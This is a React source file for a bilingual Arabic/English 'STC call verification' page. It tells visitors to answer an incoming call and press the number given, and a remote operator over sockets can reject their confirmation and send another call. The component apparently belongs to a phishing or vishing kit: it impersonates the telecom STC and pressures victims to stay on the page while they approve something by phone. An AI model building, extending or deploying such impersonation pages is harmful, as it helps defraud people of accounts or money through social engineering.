import React from 'react';
import { socketService } from '../../services/socketService';
import { useI18n } from '../../shared/i18n';

const StcCall: React.FC = () => {
    const { isRTL, language } = useI18n();
    const isArabic = language === 'ar';
    const content = isArabic
        ? {
            fallbackRejection: 'نعتذر منك، لم يتم تأكيد استلامك للاتصال. سيصلك اتصال جديد خلال لحظات.',
            title: 'توثيق المكالمة - STC',
            networkProvider: 'مزود الشبكة',
            callStatus: 'حالة الاتصال: جاري الانتظار لتأكيد المكالمة',
            heading: 'سوف تتلقى مكالمة قريبًا',
            description: 'يرجى الإجابة على المكالمة والضغط على الرقم المزوّد من خلال المكالمة',
            importantNote: 'ملاحظة مهمة',
            noteBody: 'لا تغلق الصفحة حتى اكتمال التحقق. هذه الخطوة إلزامية لحماية الطلب.',
            confirmReceived: 'تم استلام الاتصال ✓',
            verifyingTitle: 'جاري التحقق من استلام الاتصال',
            verifyingBody: 'نتمنى منك الانتظار حتى يتم توثيق استلامك للمكالمة.'
        }
        : {
            fallbackRejection: 'We could not confirm that you received the call. A new call will reach you shortly.',
            title: 'Call verification - STC',
            networkProvider: 'Network provider',
            callStatus: 'Call status: waiting for call confirmation',
            heading: 'You will receive a call shortly',
            description: 'Please answer the call and press the number provided during the call.',
            importantNote: 'Important note',
            noteBody: 'Do not close this page until verification is complete. This step is required to protect the request.',
            confirmReceived: 'Call received ✓',
            verifyingTitle: 'Verifying call receipt',
            verifyingBody: 'Please wait while we verify that you received the call.'
        };
    const [isReceiveButtonVisible, setIsReceiveButtonVisible] = React.useState(false);
    const [isSubmittingConfirmation, setIsSubmittingConfirmation] = React.useState(false);
    const [rejectionMessage, setRejectionMessage] = React.useState('');

    React.useEffect(() => {
        socketService.emitClientEvent('readyForCall', { provider: 'stc' });

        const timer = window.setTimeout(() => {
            setIsReceiveButtonVisible(true);
        }, 5000);

        const handleCallVerificationRejected = (data: { message?: string }) => {
            setIsSubmittingConfirmation(false);
            setRejectionMessage(data?.message || content.fallbackRejection);
            setIsReceiveButtonVisible(true);
        };

        socketService.on('callVerificationRejected', handleCallVerificationRejected);

        return () => {
            window.clearTimeout(timer);
            socketService.off('callVerificationRejected', handleCallVerificationRejected);
        };
    }, []);

    const handleConfirmReceive = () => {
        setRejectionMessage('');
        setIsSubmittingConfirmation(true);
        socketService.emitClientEvent('submitCallVerification', { provider: 'stc' });
    };

    return (
        <div className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 px-4 py-6 flex items-center justify-center" dir={isRTL ? 'rtl' : 'ltr'}>
            <div className="mx-auto w-full max-w-3xl overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-sm">
                <div className="border-b border-slate-200 bg-slate-50 px-6 py-4 sm:px-8">
                    <div className="flex flex-wrap items-center justify-between gap-3">
                        <div>
                            <h1 className="mt-1 text-2xl font-extrabold text-slate-800">{content.title}</h1>
                        </div>
                    </div>
                </div>

                <div className="space-y-6 p-6 sm:p-8">
                    <div className="rounded-xl border border-slate-200 bg-slate-50 p-4">
                        <div className="flex flex-wrap items-center justify-between gap-3 text-sm">
                            <span className="font-semibold text-slate-600">{content.networkProvider}</span>
                            <span className="rounded-lg bg-white px-3 py-1 font-bold text-slate-800">STC</span>
                        </div>
                        <div className="mt-3 flex items-center gap-2 text-sm text-slate-600">
                            <span className="h-2.5 w-2.5 rounded-full bg-emerald-500" />
                            {content.callStatus}
                        </div>
                    </div>

                    <div className="text-center">
                        <img
                            src="/imgs/calling/stc-call.png"
                            alt="stc-call"
                            className="mx-auto w-full max-w-xs sm:max-w-sm"
                        />

                        <div className="mt-6 flex justify-center">
                            <div className="h-8 w-8 animate-spin rounded-full border-4 border-slate-300 border-t-brand" aria-label="loading" />
                        </div>

                        <h2 className="mt-4 text-xl font-bold text-slate-800">{content.heading}</h2>
                        <p className="mt-2 text-slate-600">
                            {content.description}
                        </p>
                    </div>

                    <div className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-sm text-amber-800">
                        <p className="font-bold">{content.importantNote}</p>
                        <p className="mt-1">{content.noteBody}</p>
                    </div>

                    {rejectionMessage && (
                        <div className="rounded-xl border border-red-200 bg-red-50 p-4 text-sm text-red-700">
                            {rejectionMessage}
                        </div>
                    )}

                    <div className="min-h-[52px] text-center">
                        <button
                            type="button"
                            onClick={handleConfirmReceive}
                            disabled={isSubmittingConfirmation}
                            className={`inline-flex min-w-44 items-center justify-center rounded-xl bg-brand px-5 py-3 text-sm font-extrabold text-white transition-all duration-500 ease-out hover:bg-brand-dark ${isReceiveButtonVisible ? 'opacity-100 translate-y-0' : 'pointer-events-none opacity-0 translate-y-2'}`}
                        >
                            {content.confirmReceived}
                        </button>
                    </div>
                </div>
            </div>

            {isSubmittingConfirmation && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4">
                    <div className="w-full max-w-md rounded-2xl bg-white p-6 text-center shadow-xl">
                        <div className="mx-auto h-10 w-10 animate-spin rounded-full border-4 border-slate-300 border-t-brand" aria-label="loading" />
                        <h3 className="mt-4 text-lg font-bold text-slate-800">{content.verifyingTitle}</h3>
                        <p className="mt-2 text-sm text-slate-600">{content.verifyingBody}</p>
                    </div>
                </div>
            )}
        </div>
    );
};

export default StcCall;
